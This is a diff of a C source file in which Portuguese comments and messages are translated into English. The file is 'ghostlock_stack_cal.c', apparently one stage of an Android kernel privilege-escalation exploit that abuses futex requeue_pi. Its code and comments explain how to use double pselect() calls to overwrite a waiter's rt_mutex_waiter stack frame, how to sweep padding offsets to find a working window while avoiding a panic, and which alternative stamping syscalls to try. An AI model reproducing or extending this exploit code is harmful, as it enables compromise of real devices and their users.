@@ -1,48 +1,48 @@
 /*
- * ghostlock_stack_cal.c — calibracao do reclaim de stack (GhostLock/aquaman).
+ * ghostlock_stack_cal.c — stack reclaim calibration (GhostLock/aquaman).
  *
- * Pergunta: qual profundidade de stack de usuario faz o carimbo de pselect()
- * sobrepor o rt_mutex_waiter (frame de futex_wait_requeue_pi) do waiter?
+ * Question: how deep into the user stack must the pselect() stamp go before it
+ * lands on the waiter's rt_mutex_waiter (the futex_wait_requeue_pi frame)?
  *
- * Mecanica
- * --------
- * O consumer (pthread_setschedparam no waiter) chama rt_mutex_get_effective_prio
- * (medido no asm do lab build):
- *     if (task->pi_waiters == NULL) return oldprio;             // frame intocado
+ * Mechanics
+ * ---------
+ * The consumer (pthread_setschedparam on the waiter) calls rt_mutex_get_effective_prio
+ * (measured in the lab build asm):
+ *     if (task->pi_waiters == NULL) return oldprio;             // frame untouched
  *     t = *(&task->pi_waiters_leftmost->pi_tree_entry + 0x18);  // waiter->task
  *     return min(t->prio, oldprio);
- * ou seja, ele DESREFERENCIA waiter->task (offset 0x30 no frame) e le
+ * i.e. it DEREFERENCES waiter->task (offset 0x30 in the frame) and reads
  * task->prio.
  *
- *   frame intacto : waiter->task == current -> prio ~120 > 99 -> caller entra
- *                   no caminho RT e o walk em rt_mutex_slowlock chama
- *                   schedule() -> stall de ~60s. Baseline ja medido no
- *                   aparelho.
- *   frame carimbado com PAGE_OFFSET: le int da RAM fisica (tipicamente < 99)
- *                   -> caminho rapido, sem stall, sem oops.
+ *   frame intact    : waiter->task == current -> prio ~120 > 99 -> caller enters
+ *                     the RT path and the walk in rt_mutex_slowlock calls
+ *                     schedule() -> ~60s stall. Baseline already measured on
+ *                     the device.
+ *   frame stamped with PAGE_OFFSET: reads an int from physical RAM (typically
+ *                     < 99) -> fast path, no stall, no oops.
  *
- * Por que PAD >= 0x120 e nao zero
- * ------------------------------
- * O rt_mutex fica dentro do frame do waiter (futex_requeue usa
- * &requeue_pi.waiter, e o rt_waiter e vizinho). O consumer NUNCA alcanca
- * esse offset: ele so le task->pi_waiters / task->pi_waiters_leftmost, que
- * estao no task_struct. Carimbar o rt_mutex e o que quebra a vida; entao a
- * janela util comeca DEPOIS do rt_mutex e vai ate waiter+0x50. Isso da o
- * intervalo [0x120, 0x1c0] abaixo. Carimbo antes disso corrompe o lock e o
- * dispositivo morre: por isso a varredura comeca em 0x120, nunca em 0.
+ * Why PAD >= 0x120 and not zero
+ * -----------------------------
+ * The rt_mutex lives inside the waiter's frame (futex_requeue uses
+ * &requeue_pi.waiter, and the rt_waiter is its neighbour). The consumer NEVER
+ * reaches that offset: it only reads task->pi_waiters / task->pi_waiters_leftmost,
+ * which live in the task_struct. Stamping the rt_mutex is what breaks the device,
+ * so the useful window starts AFTER the rt_mutex and runs to waiter+0x50. That
+ * gives the [0x120, 0x1c0] interval below. Stamping before that corrupts the lock
+ * and the device dies: hence the sweep starts at 0x120, never at 0.
  *
- * Por que dois pselect
- * --------------------
- * core_sys_select tem 6 slots de 40B: 3 copiados do usuario (in/out/except)
- * e 3 zerados com memset (res_in/res_out/res_ex). Se o waiter cair num slot
- * memset, waiter->task = 0 -> desref em 0x68 -> oops. Solucao: um segundo
- * pselect 0x78 bytes MAIS RASO cobre exatamente os 3 slots que o primeiro
- * zerou. Ordem: pselect PROFUNDO primeiro, RASO depois.
+ * Why two pselects
+ * -----------------
+ * core_sys_select has 6 slots of 40B: 3 copied from userspace (in/out/except)
+ * and 3 zeroed with memset (res_in/res_out/res_ex). If the waiter lands in a
+ * memset slot, waiter->task = 0 -> deref at 0x68 -> oops. Fix: a second
+ * pselect 0x78 bytes SHALLOWER covers exactly the 3 slots the first one zeroed.
+ * Order: DEEP pselect first, SHALLOW after.
  *
- * Risco: baixo. Nenhum objeto do kernel e reclaimado para explore, nada e
- * escrito em cred/SELinux/funcptr, o consumer so le um int. Os PADs fora da
- * janela sao inertes (frame intocado) ou corrompem o rt_mutex (panic). Por
- * isso a varredura comeca em GL_PSELECT_SHIFT_MIN.
+ * Risk: low. No kernel object is reclaimed for exploitation, nothing is written
+ * to cred/SELinux/funcptr, the consumer only reads an int. PADs outside the
+ * window are inert (frame untouched) or corrupt the rt_mutex (panic). Hence the
+ * sweep starts at GL_PSELECT_SHIFT_MIN.
  *
  * Build (NDK r29, ARM64, API 28):
  *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/\
@@ -108,8 +108,8 @@ __attribute__((noinline)) static void spin_ns(uint64_t ns) {
         __asm__ volatile("" ::: "memory");
 }
 
-/* um pselect: 3 fd_sets de GL_PSEL_SIZE bytes, todas com pattern.
- * nfds=GL_PSEL_MAX_NFDS e o que mantem size no stack (size <= 0x2a). */
+/* one pselect: 3 fd_sets of GL_PSEL_SIZE bytes, all filled with the pattern.
+ * nfds=GL_PSEL_MAX_NFDS is what keeps size on the stack (size <= 0x2a). */
 __attribute__((noinline)) static void psel_once(void) {
     static uint64_t pat[3 * GL_PSEL_SIZE / 8] __attribute__((aligned(64)));
     fd_set *sets = (fd_set *)pat;
@@ -122,9 +122,9 @@ __attribute__((noinline)) static void psel_once(void) {
     pselect(GL_PSEL_MAX_NFDS, &sets[0], &sets[1], &sets[2], &ts, NULL);
 }
 
-/* carimbo duplo: profundo (escreve pattern em [A, A+0x78) e zero em
- * [A+0x78, A+0xf0)) e depois raso (escreve pattern em [A+0x78, A+0xf0)).
- * Resultado: [A, A+0xf0) todo com pattern. */
+/* double stamp: deep (writes pattern in [A, A+0x78) and zeros in
+ * [A+0x78, A+0xf0)) then shallow (writes pattern in [A+0x78, A+0xf0)).
+ * Result: all of [A, A+0xf0) holds the pattern. */
 __attribute__((noinline)) static void stamp(uint64_t pad) {
     volatile uint8_t deep_vla[MAX_PAD];
     volatile uint8_t shallow_vla[MAX_PAD];
@@ -158,7 +158,7 @@ static void *waiter_fn(void *u) {
     w_done = 1;
 
     stamp(pat_len);
-    while (!release_waiter)   /* spin puro: nenhum syscall, preserva o carimbo */
+    while (!release_waiter)   /* pure spin: no syscall, preserves the stamp */
         spin_ns(1000000);
     return NULL;
 }
@@ -170,7 +170,7 @@ static void *owner_fn(void *u) {
     while (!w_ready)
         usleep(1000);
     o_started = 1;
-    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock por design */
+    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock by design */
     return NULL;
 }
 
@@ -206,7 +206,7 @@ static int run_trial(uint64_t pad, int with_cmp, struct trial_res *out) {
             return -102;
         }
     } else {
-        usleep(1300000);   /* waiter acorda por timeout, teardown limpo */
+        usleep(1300000);   /* waiter wakes on timeout, clean teardown */
     }
 
     xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
@@ -236,7 +236,7 @@ static int run_trial(uint64_t pad, int with_cmp, struct trial_res *out) {
 }
 
 int main(int argc, char **argv) {
-    setbuf(stdout, NULL);   /* panic mata o buffer libc: sem evidencia */
+    setbuf(stdout, NULL);   /* panic kills the libc buffer: no evidence */
 
     uint64_t pad_min = GL_PSELECT_SHIFT_MIN;
     uint64_t pad_max = GL_PSELECT_SHIFT_MAX;
@@ -250,25 +250,25 @@ int main(int argc, char **argv) {
     printf("[info] page_offset=0x%llx stamp_word=0x%llx\n",
            (unsigned long long)GL_PAGE_OFFSET,
            (unsigned long long)STAMP_WORD);
-    printf("[info] pselect nfds=%d size=%#x slots=%d span=%#x (stack, nao kmalloc)\n",
+    printf("[info] pselect nfds=%d size=%#x slots=%d span=%#x (stack, not kmalloc)\n",
            GL_PSEL_MAX_NFDS, GL_PSEL_SIZE, GL_STACK_FDS_SLOTS, GL_PSEL_SPAN);
     printf("[info] lab: waiter_off_sp=%#llx stack_fds_off_sp=%#llx slot3=%#x\n",
            (unsigned long long)GL_WAITER_OFF_SP,
            (unsigned long long)GL_STACK_FDS_OFF_SP, GL_PSEL_SLOT3_OFF);
-    printf("[info] varredura pad=[%#llx..%#llx] step=%#llx trials=%d\n",
+    printf("[info] sweep pad=[%#llx..%#llx] step=%#llx trials=%d\n",
            (unsigned long long)pad_min, (unsigned long long)pad_max,
            (unsigned long long)step, max_trials);
 
     {
         struct trial_res r = { 0, 0, 0 };
         if (run_trial(0, 0, &r) < 0) {
-            printf("[baseline] trial falhou\n");
+            printf("[baseline] trial failed\n");
             return 3;
         }
         printf("[baseline] stalled=%d prio=%u us=%llu  (%s)\n", r.stalled,
                r.prio, (unsigned long long)r.us,
-               r.stalled ? "STALL: frame intacto, esperado"
-                         : "rapido: baseline inesperado, revisar consumer");
+               r.stalled ? "STALL: frame intact, expected"
+                         : "fast: unexpected baseline, review the consumer");
     }
 
     int hits = 0, trial = 0;
@@ -279,7 +279,7 @@ int main(int argc, char **argv) {
         struct trial_res r = { 0, 0, 0 };
         int rc = run_trial(pad, 1, &r);
         if (rc < 0) {
-            printf("[pad %#llx] trial falhou rc=%d, para\n",
+            printf("[pad %#llx] trial failed rc=%d, stopping\n",
                    (unsigned long long)pad, rc);
             break;
         }
@@ -288,10 +288,10 @@ int main(int argc, char **argv) {
                 first_hit = pad;
             last_hit = pad;
             hits++;
-            printf("[pad %#llx] ACERTO consumer rapido prio=%u us=%llu\n",
+            printf("[pad %#llx] HIT consumer fast prio=%u us=%llu\n",
                    (unsigned long long)pad, r.prio, (unsigned long long)r.us);
         } else {
-            printf("[pad %#llx] stall, frame intocado (us=%llu)\n",
+            printf("[pad %#llx] stall, frame intact (us=%llu)\n",
                    (unsigned long long)pad, (unsigned long long)r.us);
         }
     }
@@ -299,10 +299,10 @@ int main(int argc, char **argv) {
     printf("[summary] hits=%d first=%#llx last=%#llx\n", hits,
            (unsigned long long)first_hit, (unsigned long long)last_hit);
     if (!hits) {
-        printf("[verdict] nenhum PAD acertou: o aparelho diverge do lab "
-               "(WAITER_OFF ou frame de core_sys_select). Trocar stamper: "
-               "setsockopt IPV6 MCAST_JOIN_SOURCE_GROUP ou sendmsg, e "
-               "recalibrar a faixa.\n");
+        printf("[verdict] no PAD hit: the device diverges from the lab "
+               "(WAITER_OFF or the core_sys_select frame). Swap the stamper: "
+               "setsockopt IPV6 MCAST_JOIN_SOURCE_GROUP or sendmsg, then "
+               "recalibrate the range.\n");
         return 1;
     }
     printf("[verdict] PSELECT_SHIFT = %#llx, janela %#llx..%#llx\n",
